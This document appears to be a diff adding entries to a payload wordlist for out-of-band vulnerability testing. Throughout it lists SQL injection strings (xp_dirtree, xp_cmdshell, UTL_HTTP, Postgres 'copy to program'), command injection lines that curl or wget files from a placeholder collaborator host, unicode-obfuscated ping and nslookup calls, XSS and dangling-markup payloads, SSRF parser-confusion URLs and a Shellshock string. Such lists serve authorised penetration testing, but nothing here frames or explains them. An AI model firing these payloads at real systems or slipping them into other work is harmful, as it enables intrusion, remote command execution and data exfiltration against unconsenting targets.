+zlib://0://domain_collab;http://google.com/
+& curl http://domain_collab/.testing/rce.txt
+| curl http://domain_collab/.testing/rce.txt
+" exec master..xp_dirtree '//vps_ip:80/a'-- 
+") exec master..xp_dirtree '//vps_ip:80/a'--
+"; exec master..xp_dirtree '//vps_ip:80/a'--
+"||exec master..xp_dirtree '//vps_ip:80/a'--
+' exec master..xp_dirtree '//vps_ip:80/a'-- 
+') exec master..xp_dirtree '//vps_ip:80/a'--
+'; exec master..xp_dirtree '//vps_ip:80/a'--
+'||exec master..xp_dirtree '//vps_ip:80/a'--
+` exec master..xp_dirtree '//vps_ip:80/a'-- 
+`) exec master..xp_dirtree '//vps_ip:80/a'--
+`; exec master..xp_dirtree '//vps_ip:80/a'--
+`||exec master..xp_dirtree '//vps_ip:80/a'--
+https://0://domain_collab;http://google.com/
+OR exec master..xp_dirtree '//vps_ip:80/a'--
 & wget http://domain_collab/.testing/rce.txt
 | wget http://domain_collab/.testing/rce.txt
-&& wget https://domain_collab/.testing/rce_vuln.txt
-; wget https://domain_collab/.testing/rce_vuln.txt
+AND exec master..xp_dirtree '//vps_ip:80/a'--
+exec master..xp_cmdshell 'ping+domain_collab'
+") exec master..xp_dirtree '//vps_ip:80/a'-- 
+")) exec master..xp_dirtree '//vps_ip:80/a'--
+"; exec master..xp_dirtree '//vps_ip:80/a'-- 
+"||exec master..xp_dirtree '//vps_ip:80/a'-- 
+') exec master..xp_dirtree '//vps_ip:80/a'-- 
+')) exec master..xp_dirtree '//vps_ip:80/a'--
+'; exec master..xp_dirtree '//vps_ip:80/a'-- 
+'||exec master..xp_dirtree '//vps_ip:80/a'-- 
+`) exec master..xp_dirtree '//vps_ip:80/a'-- 
+`)) exec master..xp_dirtree '//vps_ip:80/a'--
+`; exec master..xp_dirtree '//vps_ip:80/a'-- 
+`||exec master..xp_dirtree '//vps_ip:80/a'-- 
+expect://0://domain_collab;http://google.com/
+//google.com+&@google.com#+@or.domain_collab/
+//google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.vps_ip:80/
+gopher://0://domain_collab;http://google.com/
+mailto://0://domain_collab;http://google.com/
+OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+ ;p\u0027i\u0027n\u0027g\u0027 domain_collab"
+ |p\u0027i\u0027n\u0027g\u0027 domain_collab"
+"><script src=https://domain_collab></script>
+SELECT ... INTO OUTFILE '\\\\domain_collab\a'
+telnet://0://domain_collab;http://google.com/
+AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+")) exec master..xp_dirtree '//vps_ip:80/a'-- 
+')) exec master..xp_dirtree '//vps_ip:80/a'-- 
+`)) exec master..xp_dirtree '//vps_ip:80/a'-- 
+http://google.com+&@google.com#+@or.vps_ip:80/
+"><img src='http://domain_collab/log.php?HTML=
+" OR exec master..xp_dirtree '//vps_ip:80/a'--
+' OR exec master..xp_dirtree '//vps_ip:80/a'--
+` OR exec master..xp_dirtree '//vps_ip:80/a'--
+ ||p\u0027i\u0027n\u0027g\u0027 domain_collab"
+ \u0026n\"s\"l\"o\"o\"k\"u\"p\" domain_collab"
+" AND exec master..xp_dirtree '//vps_ip:80/a'--
+' AND exec master..xp_dirtree '//vps_ip:80/a'--
+` AND exec master..xp_dirtree '//vps_ip:80/a'--
+curl http://domain_collab/.testing/rce_vuln.txt
+exec%20master..xp_dirtree%20'//domain_collab/a'
+" exec master..xp_dirtree '//domain_collab/a'--
+' exec master..xp_dirtree '//domain_collab/a'--
+` exec master..xp_dirtree '//domain_collab/a'--
+" OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+") OR exec master..xp_dirtree '//vps_ip:80/a'--
+' OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+') OR exec master..xp_dirtree '//vps_ip:80/a'--
+` OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+`) OR exec master..xp_dirtree '//vps_ip:80/a'--
+<script>$.getScript("//domain_collab")</script>
+||UTL_HTTP.request('http://vps_ip:80/')%20--%20
+" AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+") AND exec master..xp_dirtree '//vps_ip:80/a'--
+' AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+') AND exec master..xp_dirtree '//vps_ip:80/a'--
+` AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+`) AND exec master..xp_dirtree '//vps_ip:80/a'--
+" exec master..xp_dirtree '//domain_collab/a'-- 
+") exec master..xp_dirtree '//domain_collab/a'--
+"; exec master..xp_dirtree '//domain_collab/a'--
+"||exec master..xp_dirtree '//domain_collab/a'--
+' exec master..xp_dirtree '//domain_collab/a'-- 
+') exec master..xp_dirtree '//domain_collab/a'--
+'; exec master..xp_dirtree '//domain_collab/a'--
+'||exec master..xp_dirtree '//domain_collab/a'--
+` exec master..xp_dirtree '//domain_collab/a'-- 
+`) exec master..xp_dirtree '//domain_collab/a'--
+`; exec master..xp_dirtree '//domain_collab/a'--
+`||exec master..xp_dirtree '//domain_collab/a'--
+OR exec master..xp_dirtree '//domain_collab/a'--
+") OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+")) OR exec master..xp_dirtree '//vps_ip:80/a'--
+') OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+')) OR exec master..xp_dirtree '//vps_ip:80/a'--
+`) OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+`)) OR exec master..xp_dirtree '//vps_ip:80/a'--
 wget https://domain_collab/.testing/rce_vuln.txt
+AND exec master..xp_dirtree '//domain_collab/a'--
+") AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+")) AND exec master..xp_dirtree '//vps_ip:80/a'--
+') AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+')) AND exec master..xp_dirtree '//vps_ip:80/a'--
+`) AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+`)) AND exec master..xp_dirtree '//vps_ip:80/a'--
+; exec master..xp_cmdshell 'ping domain_collab'--
+") exec master..xp_dirtree '//domain_collab/a'-- 
+")) exec master..xp_dirtree '//domain_collab/a'--
+"; exec master..xp_dirtree '//domain_collab/a'-- 
+"||exec master..xp_dirtree '//domain_collab/a'-- 
+') exec master..xp_dirtree '//domain_collab/a'-- 
+')) exec master..xp_dirtree '//domain_collab/a'--
+'; exec master..xp_dirtree '//domain_collab/a'-- 
+'||exec master..xp_dirtree '//domain_collab/a'-- 
+`) exec master..xp_dirtree '//domain_collab/a'-- 
+`)) exec master..xp_dirtree '//domain_collab/a'--
+`; exec master..xp_dirtree '//domain_collab/a'-- 
+`||exec master..xp_dirtree '//domain_collab/a'-- 
+//google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.domain_collab/
+OR exec master..xp_dirtree '//domain_collab/a'-- 
+")) OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+')) OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+`)) OR exec master..xp_dirtree '//vps_ip:80/a'-- 
+t'exec master..xp_cmdshell 'nslookup vps_ip:80'--
+AND exec master..xp_dirtree '//domain_collab/a'-- 
+")) AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+')) AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+`)) AND exec master..xp_dirtree '//vps_ip:80/a'-- 
+; curl https://domain_collab/.testing/rce_vuln.txt
+'; exec master..xp_cmdshell 'ping domain_collab'--
+")) exec master..xp_dirtree '//domain_collab/a'-- 
+')) exec master..xp_dirtree '//domain_collab/a'-- 
+`)) exec master..xp_dirtree '//domain_collab/a'-- 
+http://google.com+&@google.com#+@or.domain_collab/
+http://google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.vps_ip:80/
+" OR exec master..xp_dirtree '//domain_collab/a'--
+' OR exec master..xp_dirtree '//domain_collab/a'--
+` OR exec master..xp_dirtree '//domain_collab/a'--
+ \u0026p\u0027i\u0027n\u0027g\u0027 domain_collab"
+; wget https://domain_collab/.testing/rce_vuln.txt
+" AND exec master..xp_dirtree '//domain_collab/a'--
+' AND exec master..xp_dirtree '//domain_collab/a'--
+` AND exec master..xp_dirtree '//domain_collab/a'--
+&& curl https://domain_collab/.testing/rce_vuln.txt
+" OR exec master..xp_dirtree '//domain_collab/a'-- 
+") OR exec master..xp_dirtree '//domain_collab/a'--
+' OR exec master..xp_dirtree '//domain_collab/a'-- 
+') OR exec master..xp_dirtree '//domain_collab/a'--
+` OR exec master..xp_dirtree '//domain_collab/a'-- 
+`) OR exec master..xp_dirtree '//domain_collab/a'--
+" SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+` SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+||UTL_HTTP.request('http://domain_collab/')%20--%20
+&& wget https://domain_collab/.testing/rce_vuln.txt
+" AND exec master..xp_dirtree '//domain_collab/a'-- 
+") AND exec master..xp_dirtree '//domain_collab/a'--
+' AND exec master..xp_dirtree '//domain_collab/a'-- 
+') AND exec master..xp_dirtree '//domain_collab/a'--
+` AND exec master..xp_dirtree '//domain_collab/a'-- 
+`) AND exec master..xp_dirtree '//domain_collab/a'--
+" copy (SELECT '') to program 'nslookup vps_ip:80'--
+' copy (SELECT '') to program 'nslookup vps_ip:80'--
+` copy (SELECT '') to program 'nslookup vps_ip:80'--
+") OR exec master..xp_dirtree '//domain_collab/a'-- 
+")) OR exec master..xp_dirtree '//domain_collab/a'--
+') OR exec master..xp_dirtree '//domain_collab/a'-- 
+')) OR exec master..xp_dirtree '//domain_collab/a'--
+`) OR exec master..xp_dirtree '//domain_collab/a'-- 
+`)) OR exec master..xp_dirtree '//domain_collab/a'--
+OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+" SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+") SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+"; SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+"||SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+') SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+'; SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+'||SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+` SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`) SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+`; SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+`||SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+ \u0026\u0026n\"s\"l\"o\"o\"k\"u\"p\" domain_collab"
+$(`wget https://domain_collab/.testing/rce_vuln.txt`)
+") AND exec master..xp_dirtree '//domain_collab/a'-- 
+")) AND exec master..xp_dirtree '//domain_collab/a'--
+') AND exec master..xp_dirtree '//domain_collab/a'-- 
+')) AND exec master..xp_dirtree '//domain_collab/a'--
+`) AND exec master..xp_dirtree '//domain_collab/a'-- 
+`)) AND exec master..xp_dirtree '//domain_collab/a'--
+AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+" copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+") copy (SELECT '') to program 'nslookup vps_ip:80'--
+"; copy (SELECT '') to program 'nslookup vps_ip:80'--
+"||copy (SELECT '') to program 'nslookup vps_ip:80'--
+' copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+') copy (SELECT '') to program 'nslookup vps_ip:80'--
+'; copy (SELECT '') to program 'nslookup vps_ip:80'--
+'||copy (SELECT '') to program 'nslookup vps_ip:80'--
+` copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`) copy (SELECT '') to program 'nslookup vps_ip:80'--
+`; copy (SELECT '') to program 'nslookup vps_ip:80'--
+`||copy (SELECT '') to program 'nslookup vps_ip:80'--
+;EXEC%20master..xp_dirtree%20'%5c%5cvps_ip:80%5c'+--+
+OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+")) OR exec master..xp_dirtree '//domain_collab/a'-- 
+')) OR exec master..xp_dirtree '//domain_collab/a'-- 
+`)) OR exec master..xp_dirtree '//domain_collab/a'-- 
+OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+") SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+")) SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+"; SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+"||SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+') SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+')) SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+'; SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+'||SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`) SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`)) SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+`; SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`||SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+t'exec master..xp_cmdshell 'nslookup domain_collab'--
+AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+")) AND exec master..xp_dirtree '//domain_collab/a'-- 
+')) AND exec master..xp_dirtree '//domain_collab/a'-- 
+`)) AND exec master..xp_dirtree '//domain_collab/a'-- 
+AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+") copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+")) copy (SELECT '') to program 'nslookup vps_ip:80'--
+"; copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+"||copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+') copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+')) copy (SELECT '') to program 'nslookup vps_ip:80'--
+'; copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+'||copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`) copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`)) copy (SELECT '') to program 'nslookup vps_ip:80'--
+`; copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`||copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+http://google.com+&@Ⓛ𝐨𝗰�𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@or.domain_collab/
+OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+" OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+' OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+` OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+")) SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+')) SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`)) SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+" AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+' AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+` AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+")) copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+')) copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`)) copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+" OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+' OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+` OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+" OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+") OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+' OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+') OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+` OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`) OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+" SELECT UTL_INADDR.get_host_address('domain_collab')--
+` SELECT UTL_INADDR.get_host_address('domain_collab')--
+" AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+' AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+` AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+" AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+") AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+' AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+') AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+` AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`) AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+" copy (SELECT '') to program 'nslookup domain_collab'--
+' copy (SELECT '') to program 'nslookup domain_collab'--
+` copy (SELECT '') to program 'nslookup domain_collab'--
+" OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+") OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+' OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+') OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+` OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`) OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+") OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+")) OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+') OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+')) OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+`) OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`)) OR SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+" SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+") SELECT UTL_INADDR.get_host_address('domain_collab')--
+"; SELECT UTL_INADDR.get_host_address('domain_collab')--
+"||SELECT UTL_INADDR.get_host_address('domain_collab')--
+') SELECT UTL_INADDR.get_host_address('domain_collab')--
+'; SELECT UTL_INADDR.get_host_address('domain_collab')--
+'||SELECT UTL_INADDR.get_host_address('domain_collab')--
+` SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`) SELECT UTL_INADDR.get_host_address('domain_collab')--
+`; SELECT UTL_INADDR.get_host_address('domain_collab')--
+`||SELECT UTL_INADDR.get_host_address('domain_collab')--
+ \u0026\u0026p\u0027i\u0027n\u0027g\u0027 domain_collab"
+"UNION SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+'UNION SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+`UNION SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+" AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+") AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+' AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+') AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+` AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`) AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+") AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+")) AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+') AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+')) AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+`) AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`)) AND SELECT UTL_INADDR.get_host_address('vps_ip:80')--
+" copy (SELECT '') to program 'nslookup domain_collab'-- 
+") copy (SELECT '') to program 'nslookup domain_collab'--
+"; copy (SELECT '') to program 'nslookup domain_collab'--
+"||copy (SELECT '') to program 'nslookup domain_collab'--
+' copy (SELECT '') to program 'nslookup domain_collab'-- 
+') copy (SELECT '') to program 'nslookup domain_collab'--
+'; copy (SELECT '') to program 'nslookup domain_collab'--
+'||copy (SELECT '') to program 'nslookup domain_collab'--
+` copy (SELECT '') to program 'nslookup domain_collab'-- 
+`) copy (SELECT '') to program 'nslookup domain_collab'--
+`; copy (SELECT '') to program 'nslookup domain_collab'--
+`||copy (SELECT '') to program 'nslookup domain_collab'--
+;EXEC%20master..xp_dirtree%20'%5c%5cdomain_collab%5c'+--+
+OR copy (SELECT '') to program 'nslookup domain_collab'--
+") OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+")) OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+') OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+')) OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+`) OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`)) OR copy (SELECT '') to program 'nslookup vps_ip:80'--
+OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+")) OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+')) OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`)) OR SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+") SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+")) SELECT UTL_INADDR.get_host_address('domain_collab')--
+"; SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+"||SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+') SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+')) SELECT UTL_INADDR.get_host_address('domain_collab')--
+'; SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+'||SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`)) SELECT UTL_INADDR.get_host_address('domain_collab')--
+`; SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`||SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+"UNION SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+'UNION SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`UNION SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+AND copy (SELECT '') to program 'nslookup domain_collab'--
+") AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+")) AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+') AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+')) AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+`) AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`)) AND copy (SELECT '') to program 'nslookup vps_ip:80'--
+AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+")) AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+')) AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+`)) AND SELECT UTL_INADDR.get_host_address('vps_ip:80')-- 
+BACKUP database master to disks='\\vps_ip:80\backupdb.dat'
+copy%20(SELECT '')%20to%20program%20'nslookup%20vps_ip:80'
+") copy (SELECT '') to program 'nslookup domain_collab'-- 
+")) copy (SELECT '') to program 'nslookup domain_collab'--
+"; copy (SELECT '') to program 'nslookup domain_collab'-- 
+"||copy (SELECT '') to program 'nslookup domain_collab'-- 
+') copy (SELECT '') to program 'nslookup domain_collab'-- 
+')) copy (SELECT '') to program 'nslookup domain_collab'--
+'; copy (SELECT '') to program 'nslookup domain_collab'-- 
+'||copy (SELECT '') to program 'nslookup domain_collab'-- 
+`) copy (SELECT '') to program 'nslookup domain_collab'-- 
+`)) copy (SELECT '') to program 'nslookup domain_collab'--
+`; copy (SELECT '') to program 'nslookup domain_collab'-- 
+`||copy (SELECT '') to program 'nslookup domain_collab'-- 
+OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+")) OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+')) OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`)) OR copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+" OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+' OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+` OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+")) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+')) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`)) SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+system('curl https://domain_collab/.testing/rce_vuln.txt')
+AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+")) AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+')) AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+`)) AND copy (SELECT '') to program 'nslookup vps_ip:80'-- 
+" AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+' AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+` AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+")) copy (SELECT '') to program 'nslookup domain_collab'-- 
+')) copy (SELECT '') to program 'nslookup domain_collab'-- 
+`)) copy (SELECT '') to program 'nslookup domain_collab'-- 
+" OR copy (SELECT '') to program 'nslookup domain_collab'--
+' OR copy (SELECT '') to program 'nslookup domain_collab'--
+` OR copy (SELECT '') to program 'nslookup domain_collab'--
+" OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+") OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+' OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+') OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+` OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+system('curl https://domain_collab/.testing/rce_vuln.txt');
+system('wget https://domain_collab/.testing/rce_vuln.txt');
+" AND copy (SELECT '') to program 'nslookup domain_collab'--
+' AND copy (SELECT '') to program 'nslookup domain_collab'--
+` AND copy (SELECT '') to program 'nslookup domain_collab'--
+" AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+") AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+' AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+') AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+` AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+" OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+") OR copy (SELECT '') to program 'nslookup domain_collab'--
+' OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+') OR copy (SELECT '') to program 'nslookup domain_collab'--
+` OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+`) OR copy (SELECT '') to program 'nslookup domain_collab'--
+") OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+")) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+') OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+')) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+`) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`)) OR SELECT UTL_INADDR.get_host_address('domain_collab')--
+"UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
+'UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
+`UNION SELECT UTL_INADDR.get_host_address('domain_collab')--
+" AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+") AND copy (SELECT '') to program 'nslookup domain_collab'--
+' AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+') AND copy (SELECT '') to program 'nslookup domain_collab'--
+` AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+`) AND copy (SELECT '') to program 'nslookup domain_collab'--
+") AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+")) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+') AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+')) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+`) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`)) AND SELECT UTL_INADDR.get_host_address('domain_collab')--
+") OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+")) OR copy (SELECT '') to program 'nslookup domain_collab'--
+') OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+')) OR copy (SELECT '') to program 'nslookup domain_collab'--
+`) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+`)) OR copy (SELECT '') to program 'nslookup domain_collab'--
+")) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+')) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`)) OR SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+& system('curl https://domain_collab/.testing/rce_vuln.txt');
+; system('curl https://domain_collab/.testing/rce_vuln.txt');
+| system('curl https://domain_collab/.testing/rce_vuln.txt');
+"UNION SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+'UNION SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`UNION SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+") AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+")) AND copy (SELECT '') to program 'nslookup domain_collab'--
+') AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+')) AND copy (SELECT '') to program 'nslookup domain_collab'--
+`) AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+`)) AND copy (SELECT '') to program 'nslookup domain_collab'--
+")) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+')) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+`)) AND SELECT UTL_INADDR.get_host_address('domain_collab')-- 
+BACKUP database master to disks='\\domain_collab\backupdb.dat'
+copy%20(SELECT '')%20to%20program%20'nslookup%20domain_collab'
+"><meta http-equiv="refresh" content='0;URL=ftp://vps_ip:80?a=
+")) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+')) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+`)) OR copy (SELECT '') to program 'nslookup domain_collab'-- 
+&& system('curl https://domain_collab/.testing/rce_vuln.txt');
+|| system('curl https://domain_collab/.testing/rce_vuln.txt');
+")) AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+')) AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+`)) AND copy (SELECT '') to program 'nslookup domain_collab'-- 
+() { :;}; curl http://vps_ip:80/.testing/shellshock.txt?vuln=12
